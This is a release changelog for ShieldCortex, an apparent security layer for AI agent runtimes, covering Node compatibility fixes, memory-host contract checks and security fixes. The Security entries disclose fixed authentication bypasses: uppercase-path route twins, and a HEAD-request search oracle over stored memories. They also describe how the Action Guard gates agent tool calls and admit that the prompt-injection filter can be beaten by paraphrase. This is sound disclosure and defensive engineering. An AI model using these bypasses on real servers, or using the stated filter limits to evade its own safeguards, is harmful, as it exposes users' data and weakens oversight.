  - **Missing request bodies.** body-parser 2.x leaves `req.body` **`undefined`** when no parser matched, where body-parser 1.x set `{}`. A request with no `Content-Type: application/json` matches no parser, so every handler that destructures `req.body` threw a `TypeError` instead of validating: 20 of 21 mutating endpoints measured went from a clean `400` (or, for `/api/cloud/config` and `/api/iron-dome/activate`, a `200` that applied the config) to a `500`; the twenty-first, `/api/license/activate`, kept its `400` but replaced the validation message with the `TypeError` text. Restored by a single middleware registered immediately after the parsers, so every handler — including ones not yet written — sees the express-4 default again. Dashboard clients were never affected; the blast radius was external CLI and integration clients of the Defence API v1.
- **Node 24 worker compatibility:** `better-sqlite3` moves from 12.x to the Node-API-based 13.x line, removing the `node::ObjectWrap` cleanup abort that crash-looped worker mode during predictive consolidation on Node 24. Supported runtimes are **Node 22.14+ LTS or Node 24+** (`^22.14.0 || >=24.0.0`); Node 23 lacks Node-API 10 and is unsupported. CI runs the exact 22.14.0 floor and Node 24, and the shipped GitHub Action, OpenClaw plugin and ClawHub metadata advertise the same policy. Node 20 users must upgrade before installing this release.

### Fixed
- **#471:** `shieldcortex doctor` no longer SIGABRTs at process teardown on Node 24 (`Database::~Database` → `Assertion failed: (env) != nullptr`, exit 134). The cause is the same better-sqlite3 12 `node::ObjectWrap` cleanup as the worker crash, and the actual fix is the move to the 13.x line recorded under *Changed* above. The doctor's existing DB-check logic is unchanged — it never owned the connection that aborted (every DB check opens its own short-lived read-only handle). A temporary end-of-run `closeDatabase()` added during this fix's review was reverted before release: it was inert on the shipped CLI path, where `runDoctor` never initialises the module-global handle it would close, and unsafe for embedded callers, where closing the live singleton also unlinks the startup lock out from under a running MCP/OpenClaw host. What is new here is the regression guard: the live-CLI test now builds a real initialised database in an isolated `HOME` before spawning `shieldcortex doctor`, so the destructor actually runs, and asserts the child died of no signal, exited 0, printed no `Assertion failed: (env) != nullptr`, and reported the database itself healthy. That spawn helper previously mapped a `null` exit code to 0, which would have scored a SIGABRT death as a green doctor run. The dependency floor fixes a correctly installed host; it cannot fix a **stale** one, whose `node_modules` still holds 12.x after an upgrade even though every manifest you can read says `^13.0.3`. On Node 24 that host aborted from a handle destructor part-way down the check list (`checkDiskUsage` was where it landed), printing no report at all. `shieldcortex doctor` now runs an early **Database engine** preflight — second in the check list, ahead of every check that opens the database — which reads the version off the manifest of the better-sqlite3 the process would actually load, and on Node >=24 with an installed major below 13 fails and **stops the run** so the report is what the operator gets instead of the crash. It says the installed engine is incompatible and names its version and path; the remedy is to upgrade/reinstall ShieldCortex so npm re-resolves `^13.0.3`, and it states that rebuilding does not help (npm rebuild recompiles the same 12.x). Node 22 is untouched — 12.x runs there, so a 12.x tree on Node 22 reports a pass, not a new failure. An unresolvable, unreadable or malformed installed version warns that nothing was established rather than claiming the engine is fine — and on Node >=24 that warning also **stops the run** (still exit 0), stating that the remaining checks were not run because compatibility is unproven: an unknowable engine leaves the same abort reachable as a proven-stale one. On Node <24 it stays an ordinary non-halting warning with no reinstall guidance, since there is no incompatibility finding there. The installed version must be a full semantic version — `semver.coerce` salvage is gone, so junk like `13-garbage` reads as unknown, never as a resolved 13.x pass.
- **Native binding failures cannot masquerade as database corruption.** better-sqlite3 13 prebuild-path, Node-API-version, binary-format, shared-library and addon-permission failures now stay on the install/remediation path instead of reaching the database-corruption recovery branch. The regression gate resolves and inspects the actual packaged native binary, fails closed if it cannot, and runs prepared-statement GC in a bounded subprocess so the original Node 24 abort path is exercised rather than skipped.
...
### Security
- **API authentication could be bypassed two ways, by respelling the path and by changing the method (#474).** The gate asked `req.path.startsWith('/api/')`, a case-SENSITIVE question about a router that matches case-INSENSITIVELY, so every protected route had an unprotected uppercase twin: `GET /API/gated-stats` answered `200` with no `Authorization` header at all, as did `GET /API/memories`, and `POST /API/memories` and `POST /API/sql` both wrote. The gate and the `/api/{*splat}` catch-all now answer from one shared definition of "this is an API path", normalised over the same path view the router reads, so the gated set and the routed set cannot drift apart; percent-encoding is left encoded rather than decoded, so normalising cannot manufacture a traversal the raw path did not contain. Separately the gate exempted `HEAD` alongside `OPTIONS` "for CORS preflight" — preflight is `OPTIONS`, and express routes `HEAD` to the `GET` handler, so the handler ran unauthenticated and Node suppressed only the body: **60 of 125 routes answered `200`** with a `Content-Length` and a content-derived `ETag` byte-identical to the authenticated response, which made `HEAD /api/memories?mode=search&query=…` a working search oracle over the memory store one content-length at a time. Reads only — `app.post`/`patch`/`delete` routes do not match `HEAD` — but it reached the **non-loopback bind** too, the one mode where the token is the sole defence because `/api/auth/session-token` is deliberately not registered there. `OPTIONS` is now the only exempt method, and an unauthenticated `HEAD` is the same constant `401` an unauthenticated `GET` gets.
- **A refused CORS origin is a `403`, not a `500` (#466).** The `cors` origin callback denied with a bare `Error`, which carries no status, so a policy decision about the caller was reported as a server fault: `GET /api/health` with a disallowed `Origin` answered `500 {"error":"Internal server error","code":"INTERNAL"}`. On the JSON plane it is now `403 {"error":"Origin not allowed","code":"CORS_DENIED"}`. The rejected origin — the caller's own string — stays in the server log and is never echoed into the response. The refusal deliberately carries its own status rather than an `http-errors` `status` tag, because express's `finalhandler` reads those tags as well and tagging would have moved the dashboard shell's status too; **non-API paths keep the status they had.**
- **The dashboard shell's error page no longer prints a stack trace (#466).** Keeping express's HTML error page for non-API paths is a deliberate scope boundary; printing `err.stack` into it was not. An unauthenticated `POST /` with a truncated JSON body answered a `400` HTML page carrying the absolute install path, the `node_modules` layout and body-parser's internals, and a refused `Origin` on `/` did the same for the server's own source tree. `finalhandler` renders the stack unless the app's `env` setting reads `production` — and that setting, not `NODE_ENV`, is the only thing it consults; nothing in the server's startup path set either, so the stack printed in every real install. The page now carries its status message and nothing else, at the same status code, and the stack goes to the server log where the operator rather than the caller reads it.
- **The API plane no longer answers an unhandled error with a stack trace (#466).** `PATCH /api/xray/findings/:id` has no `try`/`catch`, so the express-5 `req.body` `TypeError` above reached express's default error handler: an HTML page whose `<pre>` is the stack, carrying absolute filesystem paths for both the source tree and `node_modules` — in an API whose catch-all exists specifically to return JSON instead of express HTML. The same page answered **any** malformed JSON body with a `400`, on every path, and a rejected CORS origin with a `500`. Every path express routes to the JSON API now ends at a handler that replies `500 {"error":"Internal server error","code":"INTERNAL"}` (or the client-error status an `http-errors`-tagged error carries, as `{"error":"Bad request","code":"BAD_REQUEST"}`, or the exact response a refusal this server authored names, as the `CORS_DENIED` above) and logs the stack server-side only. It is scoped by the same single definition of "this is an API path" the auth gate uses, so the gated plane and the sanitised plane cannot drift apart; non-API paths keep express's default error PAGE, at its own status code, without the trace inside it. Filesystem paths a handler puts into a response deliberately are a separate matter and not covered by this — `POST /api/sessions/import-jsonl` still echoes an absolute glob in its `404`, which is tracked on its own.
- **What the L2 floor is, stated plainly.** L2 is a *deterministic floor* for explicit agent-directed imperatives from untrusted origins. It is **not** a >=90% detector against unrestricted paraphrase, and it should not be deployed, described, or relied on as one: an attacker free to rephrase will get text past it. **Effect control (Action Guard / Iron Dome) remains the primary defence** — L2 narrows what reaches the model, not what the model is permitted to do. Action Guard defaults and the automatic tool-response injection-scanning defaults are **unchanged** by this work.
...
- **OpenClaw 2026.8.1 native `exec` contract:** live fields `workdir`, `yieldMs`, `background`, `timeoutSeconds`, `pty`, `elevated`, `host`, `security`, `ask`, `node` no longer mint `unknown-keys` approval cards. `host` on this contract is an exec target enum, not a URL. Command/env evidence and catastrophic wipes stay fail-closed. MCP/unknown wrappers do not inherit the relief.
- **Action Guard re-enable UX loop:** native `TaskOutput` now accepts the live typed `{ task_id, block, timeout }` contract (`timeout` 0–600000) without widening `BashOutput` or `TaskStop`. Reviewed native web/delegation tools strip and audit inert host-contract drift instead of minting approval cards, while command/path/URL/argv evidence still fails closed and catastrophic wipes remain terminal. Current 28-field `sessions_spawn` work is zero-card attended and zero-deny unattended. Syntactically MCP-fronted names (case-insensitive) no longer inherit or suffix-guess first-party contracts: they use the generic `unknown` schema family, strip inert structured fields from the guard view, and retain the shared raw command/argv evidence scan; harmless full 28-field OpenClaw- and third-party-spelled bags stay zero-card/zero-deny while dangerous and catastrophic evidence remains gated. Tool names that merely contain exec substrings (for example `PushNotification`, `share_file`, and GitHub workflow `run` tools) no longer get the exec schema, but their command-bearing siblings are still scanned. A shared evidence pass now treats `command` + `args` + `argv` as one operation on every schema outcome and propagates dangerous findings. Reviewed native exec-vector contracts preserve literal argv boundaries: data commands such as `echo` / `printf` / `grep` / Git message operations no longer execute-classify their arguments, including shell metacharacters and adjacent quoted words, while interpreters, bare vectors, non-data commands, unknown tools, and MCP-fronted names remain fail-closed. Unreadable over-budget evidence now takes the non-widenable `invalid_tool_input` approval path instead of misclassifying benign deep manifests as catastrophic; malicious evidence inside the readable budget still wins. Gmail-style `to` / `cc` / `bcc` string arrays are typed and union-scanned across every recipient, so a local primary recipient cannot hide an external copy. Drifted field names are C0/C1/Unicode-line-break sanitised before logs and audit observations. Scanned-clean schema errors have the same approval-required decision on OpenClaw, Claude Code, and Hermes; they remain non-auto-approvable and cannot be softened by advisory mode.
...
### Added
- **#395 (Track A T3 — defended native import-once):** Native Markdown enters ShieldCortex only through the full defence pipeline. `shieldcortex memories import-native` is dry-run by default; `--apply` admits via `addMemory` then archives sources. Provenance is `source_kind=native_import` with batch/origin/hash; never auto-attested; trust/salience ceiling 0.7; SC-wins on exact/near duplicates; poison and pipeline-down fail closed and do not archive.
- **#393 (Phase 1 — T1 host contract enforcement):** `sc_only` / `disable_native_inject` become bus laws doctor can prove, not labels it takes on trust.
  ...
  - **No PASS from absence:** `checkMemoryHostContract` used to report ✅ "no paper-contract signals on disk" whenever it found nothing. Unknown evidence is now WARN "cannot determine" under `dual_legacy` and **FAIL** under `import_only` / `sc_canonical` (plane-policy drift matrix), and a bound host with native memory on is always FAIL.
  - **Honest per-runtime remediation:** a Hermes-primary box is no longer told to edit `agents.defaults.memorySearch` in an OpenClaw config it does not have. Hermes proves off via `memory.memory_enabled=false` + `memory.user_profile_enabled=false` in `~/.hermes/config.yaml`; a native `MEMORY.md` written within 7d outranks any switch that claims otherwise. Claude Code proves off via native memory-tool store absence plus SC owning session-start; a stale store is `unknown`, not off.
  - **Honest sidecar posture** (`memory.hostContract.posture = mcp_sidecar_no_inject`, residual lock 9): legal only with SC inject off — declaring it alongside a live inject contract is FAIL ("never both"), and any other posture string is FAIL (`coexist_dedup` stays illegal). `memory.hostContract.runtimes` declares bound runtimes; declaration only *adds* scrutiny and can never supply the off-proof.
  - Tests: `src/memory/__tests__/host-contract-393.test.ts` (57 cases — full runtime matrix, absent/unreadable/stale evidence, pack-delivery requirement, no-false-PASS sweep, every SOL r1+r2 blocker shape) and the T1 matrix in `src/cli/__tests__/doctor-memory-plane-348.test.ts` (36 cases on real disk fixtures), including the Hermes-bound fixture that must FAIL `sc_only` even with Hermes' native switches off; `hook-command-resolution.test.ts` pins the executable-trust classifier (25 cases).
  - **Signed fix path** (`shieldcortex config --memory-host-posture <mcp_sidecar_no_inject|bus_contract>`, `--memory-host-runtime <openclaw|claude_code|hermes>[,…]`): same `mutateRawConfig` re-signing discipline as `--memory-inject-contract`. The sidecar posture writes `memory.inject.mode=off` in the same signed mutation, so the fix path cannot create the "sidecar plus live bus" state the check fails on.
  - **Pack claims match the contract** (`scripts/lib/inject-pack.mjs` `PACK_HEADER` / `packHeaderFor`, `scripts/session-start-hook.mjs`): with a bus-law contract the session-start pack heads itself as the memory plane; with no contract it heads itself as *advisory sidecar recall* and no longer titles itself `# Project Context:` — native host memory is still the session plane, so SC claims nothing (T1 acceptance: contract off → no canonicity claim).
  - **`inject.mode: off` now means off:** the legacy session-start formatter used to emit a memory block regardless of inject mode, so the honest sidecar posture still put SC memory on the automatic bus. `off` (and `turn`) now emit nothing at session start. Unconfigured installs are unchanged — mode still defaults to `start`.
  - **SOL review hardening (H1–H6, no PASS from partial looks):**
    - *OpenClaw delivery proof* — a bare `hooks/cortex-memory` directory no longer counts as wiring. `sc_bus` is renamed `wired_proven` (static proof, never a delivered receipt — the PASS message says "runtime delivery not attested") and requires the installer's authoritative artifact set (`HOOK_FILES`: `HOOK.md`/`handler.ts`/`runtime.mjs`, byte-current via `hookFilesStale`) plus a host config that does not set `hooks.internal.entries.cortex-memory.enabled=false`. Absent/incomplete artifacts ⇒ `not_wired`; stale/unreadable ⇒ `unknown`.
    - *Claude Code discovery* — a native memory-tool store binds the runtime even without `settings.json`; truncated store scans (50-file/200-project caps) now set `scanComplete=false` (unknown, never off); SessionStart ownership requires the exact supported command shape (`isShieldCortexHookCommand` in `src/setup/hook-command-resolution.ts`) — `echo shieldcortex` and lookalike binaries no longer count.
    - *OpenClaw workspaces* — configured `agents.defaults.workspace` and per-agent workspaces are inspected (bounded, cap 16); unreadable `AGENTS.md`/`MEMORY.md` that would have been consulted demotes `off_proven` to `unknown`.
    - *Hermes profiles* — every `~/.hermes/profiles/*/config.yaml` is evaluated independently: a profile with native memory on defeats root `false`/`false`; missing/unreadable/truncated profile evidence caps the proof at `unknown`.
    - *Shared inject-mode law* — doctor mirrors the emitter's normalization (closed enum `off|start|turn|both`, trim/lowercase, `false`/`0`⇒off, unset⇒`start`) via `readInjectModeStrict`, with junk failing as illegal instead of green-washing (`mode:"bogus"` could PASS `disable_native_inject` while the runtime injected); a bare `memory.nativeInjectContract` now counts as configured (emitter injects at default start); the unconfigured diagnostic states the emitter default instead of a false "inject off". Parity is test-pinned against `scripts/lib/inject-pack.mjs`.
    - *Config hygiene* — combined `shieldcortex config` memory-flag invocations are all-or-nothing (closed-enum values preflighted before any signed write); `--memory-host-posture bus_contract` clears the stale `postureSetAt` stamp; both #393 setters joined the corrupt-config atomicity writer matrix.
  - **SOL round-2 hardening (B1–B6, fail-closed at every remaining edge):**
    - *OpenClaw bootstrap files* — both `MEMORY.md` **and** `memory.md` are probed in every inspected workspace, and a live one (written within 7d) is native-ON under **every** plane, `dual_legacy` included: OpenClaw bootstraps them into session context natively, so AGENTS.md wording is corroboration, never a precondition. The r2 false PASS (`dual_legacy` + `sc_only` + `memorySearch=false` + wired hook + live `MEMORY.md`) is a regression test.
    - *Hermes profile-only binding* — a profile tree (`~/.hermes/profiles/*`) or native Hermes memory artifact binds the runtime even with root config, SC plugin, and declaration all absent (mirrors Claude's store-presence binding), so a profile-only brain can no longer vanish from a verdict carried to PASS by another runtime.
    - *SessionStart executable trust* (`hookCommandTrust` in `src/setup/hook-command-resolution.ts`) — a shape-valid command must also RESOLVE: bare names are looked up the way the hook's own `sh -c` would (and the resolved path is classified), symlinks are followed, and world-writable staging roots (`/tmp`, `/var/tmp`, `/dev/shm`) cap trust at `suspicious`. Unresolvable ⇒ `not_wired` (the #146 dead-hook shape can no longer own session-start); suspicious (e.g. `/tmp/shieldcortex`) ⇒ `unknown`, never `wired_proven`.
    - *Sidecar demands explicit off* — `posture=mcp_sidecar_no_inject` PASSes only when `memory.inject.mode` is explicitly the normalized `off` (the shape the signed setter writes). A hand-crafted posture-only blob (inject unconfigured ⇒ emitter defaults to `start` and still emits legacy sidecar recall) is FAIL with the signed-setter remediation. The unconfigured-inject diagnostic now states that legacy sidecar recall is emitted, instead of the false "emits nothing".
    - *Claude native preambles* — `~/.claude/CLAUDE.md` and per-project `CLAUDE.md` (within the bounded projects scan) are probed as native automatic-memory artifacts: live-within-7d ⇒ native ON, present-but-quiet or unreadable ⇒ unknown. An exact-looking SessionStart with no scanned store can no longer PASS past an active preamble brain.
    - *OpenClaw state root* — config, hook, and workspace evidence all honour `OPENCLAW_STATE_DIR` (falling back `~/.openclaw`), so green artifacts under the default root cannot certify an unwired custom-root runtime; the drift check shares the root and probes `memory.md` too. Missing packaged `HOOK_SOURCE` now reads as `unverifiable` (delivery unknown) instead of inheriting `hookFilesStale`'s installer-shaped "not stale" as byte-current.
    - *Junk declarations fail loud* — unsupported `memory.hostContract.runtimes` entries (or a non-array value) FAIL with the signed-setter remediation instead of being silently filtered out of the scrutiny set.
  - **SOL round-3 hardening (B1–B6 + nit, every host law verified against the OpenClaw source):**
    - *Global internal-hook gate* — OpenClaw loads **zero** internal hooks unless `hooks.internal.enabled` is truthy (`loadInternalHooks`), so byte-current SC artifacts behind a closed gate are `not_wired`, never `wired_proven` — the r2 "legitimate PASS" fixture omitted the flag and codified a false PASS (now the regression). A provably closed gate outranks artifact staleness; absent `openclaw.json` stays `unknown` (legacy config filenames are unprobed); remediation names the flag, which `shieldcortex install` does not own.
    - *Bootstrap ownership is presence-based* — `resolveMemoryBootstrapEntries` discovers `MEMORY.md`/`memory.md` with `fs.access` and loads them with **no mtime or size threshold**: any non-empty bootstrap file is native ON on every plane (the 7d/64B gate let an eight-day-old or 40-byte brain PASS while injected each session). Recency survives only as proof-text corroboration; a zero-byte file is the one presence that can still prove off. Remediation: archive/remove.
    - *Implicit per-agent workspaces* — a configured non-default agent without an explicit workspace still resolves one at `<stateDir>/workspace-<agentId>` (`resolveAgentWorkspaceDir`); doctor now mirrors the full host resolution — `normalizeAgentId` semantics, first-entry-wins duplicates, default-agent detection, and the home-anchored default workspace `~/.openclaw/workspace[-<OPENCLAW_PROFILE>]` that ignores `OPENCLAW_STATE_DIR` — so a live `workspace-<id>/MEMORY.md` can no longer ride defaults-off plus a wired hook to PASS. Still bounded by the 16-path cap; overflow marks the scan incomplete.
    - *Project CLAUDE.md at the real root* — Claude Code's automatic project instructions live at `<root>/CLAUDE.md` / `<root>/.claude/CLAUDE.md` in the project hierarchy, **not** under `~/.claude/projects/<key>/` (transcripts + memory store). `decodeClaudeProjectKey` walks the real filesystem re-encoding child names against the lossy `-` key encoding (ambiguity probes every candidate root; extra probes only add ON evidence); undecodable keys / unreadable walks surface as unknown with honest wording, and key-dir `CLAUDE.md` clutter is inert. Projects Claude has no key for remain a documented attestation limit — but silence at a wrong location can no longer read as `off_proven`.
    - *SessionStart matcher coverage* — a valid, resolving SC command under `matcher:"compact"` is wiring for the wrong bus: wired now requires a matcher covering `startup` (absent/empty/`*` = all sources; a string matcher is a regex tested against the source). Matcher-excluded commands are positively `not_wired`; a matcher doctor cannot evaluate (non-string, invalid regex) caps the bus at `unknown`.
    - *Path overrides with host semantics* — `OPENCLAW_STATE_DIR` / `OPENCLAW_CONFIG_PATH` (and legacy `CLAWDBOT_*`) resolve the way `resolveUserPath` does: leading `~` expands against the OpenClaw-effective home (`OPENCLAW_HOME` > `HOME` > `USERPROFILE`); `~user` and relative values resolve against the OpenClaw **process** cwd, which doctor cannot know — those are now unresolvable, keeping OpenClaw bound with both buses `unknown` instead of probing a literal `~/x` tree while the runtime vanishes and another runtime carries the PASS. Explicit relative agent-workspace values mark the enumeration incomplete for the same reason.
    - *Posture junk stays loud* — a present non-string `memory.hostContract.posture` FAILs as illegal (mirroring runtime-declaration junk) instead of dissolving to "no posture"; carried un-coerced because `["mcp_sidecar_no_inject"]` stringifies to the legal posture.
  - **SOL round-4 hardening (B1–B4, every host law verified against the OpenClaw source):**
    - *Ancestor CLAUDE.md preambles* — Claude Code loads parent-directory preambles for sessions in nested directories, so a decoded project root with clean leaf files could prove off under a live ancestor brain. Each decoded root's ancestors are now probed (`CLAUDE.md` + `.claude/CLAUDE.md`) up to and including `$HOME` — or the filesystem root for projects outside it — deduped across projects and capped at 10 levels, with truncation surfacing as an incomplete scan. Live ancestor ⇒ native ON; unreadable ⇒ unknown.
    - *Relative `OPENCLAW_HOME` is unresolvable* — the host returns a non-`~` `OPENCLAW_HOME` verbatim and `path.resolve()`s it against the OpenClaw **process** cwd (`infra/home-dir.ts`); doctor resolving the same value against its own cwd probed a decoy tree. Relative / `~user` / unexpandable-`~` values (and the nothing-resolves cwd fallback) now cap OpenClaw at bound-with-buses-unknown via the r3 unresolvable-override channel, never probed against a guessed root.
    - *Default-workspace hook shadowing* — OpenClaw merges hook sources extra < bundled < managed < **workspace** (workspace wins by hook *name*) and the gateway loads them from the default agent workspace, so pristine managed artifacts could be silently replaced at load. Doctor now resolves that workspace exactly as `resolveAgentWorkspaceDir(cfg, defaultAgentId)` does (entry workspace > `agents.defaults.workspace` > `~/.openclaw/workspace[-<profile>]`, host path semantics) and clears its `hooks/` dir only when nothing there can shadow `cortex-memory`: a byte-current identical shadow still counts as the pack; differing content, frontmatter `name:` rebrands (or YAML name values doctor cannot evaluate plainly), `package.json` manifest redirection, unreadable evidence, cap overflow, or an unresolvable default workspace all cap the SC bus at `unknown`. The agent-entries mirror now matches `listAgentEntries` exactly (array members included) and is shared with the workspace enumeration.
    - *Runtime eligibility (npx)* — the packaged `HOOK.md` requires `npx`, and OpenClaw drops hooks whose `requires.bins` do not resolve on PATH (`shouldIncludeHook` → `evaluateRuntimeRequires`), so byte-current artifacts behind an open gate could still register nothing. Doctor mirrors `hasBinary` against its **own** PATH: a missing binary caps at `unknown` (the gateway's PATH may differ, so neither registration nor exclusion is attestable — and the same divergence in the other direction stays a documented residual); an available binary remains static attestation with unchanged `statically wired` wording. The bins pin is drift-guarded against the packaged `HOOK.md` requires block.
  - **SOL round-5 hardening (B1–B2, both verified against the OpenClaw source):**
    - *`$include` makes the raw config ungradable* — OpenClaw resolves `$include` directives **anywhere** in `openclaw.json` and deep-merges the included files (objects recursively, arrays concatenated) *before* anything evaluates the config (`config/io.ts` → `config/includes.ts`), so the raw root JSON doctor reads can disagree with every gate the host actually enforces — an included `entries.cortex-memory.enabled=false` beside a root open gate certified `wired_proven`, and included `agents.list` entries can re-enable `memorySearch` past a root off-proof. Doctor does not reimplement the host resolver (path guards, JSON5, depth caps — a drift trap): any detected `$include` now caps every config-derived reading at honest `unknown` — hook gates (`openClawHookConfigEnabled`, never a raw-file `gate_off` either), memorySearch/agents defaults, workspace enumeration (incomplete), and the default agent workspace (unresolvable, so the shadow probe cannot clear).
    - *Escaped YAML frontmatter never clears the shadow scan* — the host's frontmatter parser YAML-decodes quoted keys and `\u` escapes (`markdown/frontmatter.ts` `YAML.parse`), so `"\u006eame": "\u0063ortex-memory"` rebrands a workspace hook as `cortex-memory` while matching neither the literal scan nor a plain `name:` line. `probeOpenClawHookMdRebrand` (new): a workspace hook's `HOOK.md` clears only when provably inert under **both** host parsers — every frontmatter line blank, a comment, an indented continuation under a column-0 entry, or a plain-ASCII column-0 `key: value` entry. Quoted keys **or values**, escapes, flow maps, block scalars, indented roots, and unparseable lines are an unproven rebrand ⇒ SC bus `unknown`.
...
- **Operator retry control for headless denials (#310) — ships DARK behind `actionGuard.retryCards: false`.** A `denied_no_prompt_surface` denial stays terminal; what it now leaves behind is a *fingerprint*, not anything spendable. An operator turns one into a retry two ways: an OpenClaw card (`allow-once` / `deny`, budgeted at 1 per identity + 3 per digest window, authenticated by a 256-bit `claimNonce` that is stored only as an HMAC and reaches the waiter on an inherited fd), or `shieldcortex approve --denial <actionId>` in a real terminal. A grant is one locked write with `approvedAt` always set, scoped to `{cwd, tool}` (AND-matched, cwd realpath-canonicalised; `sessionKey` is diagnostic only, so the next cron tick's fresh session still spends it), one-shot, and time-boxed by `actionGuard.retryGrantTtlMs` (default 10m). Deny opens a *windowed silence* (`actionGuard.denySuppressionMs`, default = the #331 digest window), advances the deny epoch, and revokes any unspent grant in the same write — deny always beats an approve that has not been spent. New single flock-guarded store `~/.shieldcortex/approvals/retry-control.json` (0600) holds fingerprints, suppression, launch claims, budget, grants and consumption; the #118 approvals store is untouched and stays live-hold-only. New `dnp-retry-waiter` never calls `approveRequest`, and never acks a tap before the store says ok. Catastrophic tier has no path to any of it, cards can never mint or spend `reviewedScripts`, and no alert ever carries a spendable token. `budget_exhausted` and unspent-grant expiry now appear on the operator digest/webhook copy with the actionIds that lost a card and the `--denial` command that still works. TTY-only escape hatches `--any-origin` and `--override-deny` each require a typed confirmation naming what is being handed out. See `docs/design/ADR-2026-08-19-retry-control.md` — default flips only after the soak gate.
